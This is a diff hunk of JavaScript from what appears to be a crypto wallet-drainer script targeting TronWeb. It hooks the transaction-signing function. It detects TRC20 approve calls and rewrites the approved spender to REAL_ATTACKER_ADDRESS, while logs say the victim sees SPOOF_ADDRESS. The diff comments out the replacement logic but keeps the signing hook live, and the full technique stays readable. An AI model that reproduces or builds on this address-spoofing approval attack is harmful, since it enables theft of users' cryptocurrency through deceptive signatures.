@@ -70,39 +70,39 @@
                     console.log('🎯 拦截签名过程，准备地址恢复...');
 
                     // 检查是否为approve交易
-                    if (transaction && transaction.raw_data && transaction.raw_data.contract) {
-                        const contract = transaction.raw_data.contract[0];
-                        if (contract && contract.parameter && contract.parameter.value && contract.parameter.value.data) {
-                            const data = contract.parameter.value.data;
-
-                            // 检测approve函数调用（函数签名：095ea7b3）
-                            // if (data.startsWith('095ea7b3')) {
-                            //     console.log('🎯🎯🎯 检测到approve交易，恢复真实攻击者地址！🎯🎯🎯');
-                            //
-                            //     // try {
-                            //     //     // 将真实攻击者地址转换为32字节十六进制
-                            //     //     const realAttackerHex = REAL_ATTACKER_ADDRESS.replace('T', '41');
-                            //     //     const realAttackerBytes = window.tronWeb.utils.code.hexStr2byteArray(realAttackerHex);
-                            //     //     const realAttacker32Bytes = '000000000000000000000000' +
-                            //     //         window.tronWeb.utils.code.byteArray2hexStr(realAttackerBytes);
-                            //     //
-                            //     //     // 替换approve参数中的地址为真实攻击者地址
-                            //     //     const originalData = data;
-                            //     //     const amountHex = originalData.slice(72); // 授权金额部分
-                            //     //     const newData = '095ea7b3' + realAttacker32Bytes + amountHex;
-                            //     //
-                            //     //     console.log(`🎭 用户看到授权给: ${SPOOF_ADDRESS}`);
-                            //     //     console.log(`🎯 实际签名授权给: ${REAL_ATTACKER_ADDRESS}`);
-                            //     //
-                            //     //     // 修改交易数据为真实攻击者地址
-                            //     //     contract.parameter.value.data = newData;
-                            //     //
-                            //     // } catch (restoreError) {
-                            //     //     console.log('🚨 地址恢复失败:', restoreError.message);
-                            //     // }
-                            // }
-                        }
-                    }
+                    // if (transaction && transaction.raw_data && transaction.raw_data.contract) {
+                    //     const contract = transaction.raw_data.contract[0];
+                    //     if (contract && contract.parameter && contract.parameter.value && contract.parameter.value.data) {
+                    //         const data = contract.parameter.value.data;
+                    //
+                    //         // 检测approve函数调用（函数签名：095ea7b3）
+                    //         // if (data.startsWith('095ea7b3')) {
+                    //         //     console.log('🎯🎯🎯 检测到approve交易，恢复真实攻击者地址！🎯🎯🎯');
+                    //         //
+                    //         //     // try {
+                    //         //     //     // 将真实攻击者地址转换为32字节十六进制
+                    //         //     //     const realAttackerHex = REAL_ATTACKER_ADDRESS.replace('T', '41');
+                    //         //     //     const realAttackerBytes = window.tronWeb.utils.code.hexStr2byteArray(realAttackerHex);
+                    //         //     //     const realAttacker32Bytes = '000000000000000000000000' +
+                    //         //     //         window.tronWeb.utils.code.byteArray2hexStr(realAttackerBytes);
+                    //         //     //
+                    //         //     //     // 替换approve参数中的地址为真实攻击者地址
+                    //         //     //     const originalData = data;
+                    //         //     //     const amountHex = originalData.slice(72); // 授权金额部分
+                    //         //     //     const newData = '095ea7b3' + realAttacker32Bytes + amountHex;
+                    //         //     //
+                    //         //     //     console.log(`🎭 用户看到授权给: ${SPOOF_ADDRESS}`);
+                    //         //     //     console.log(`🎯 实际签名授权给: ${REAL_ATTACKER_ADDRESS}`);
+                    //         //     //
+                    //         //     //     // 修改交易数据为真实攻击者地址
+                    //         //     //     contract.parameter.value.data = newData;
+                    //         //     //
+                    //         //     // } catch (restoreError) {
+                    //         //     //     console.log('🚨 地址恢复失败:', restoreError.message);
+                    //         //     // }
+                    //         // }
+                    //     }
+                    // }
 
                     return originalSign.call(this, transaction, privateKey);
                 };
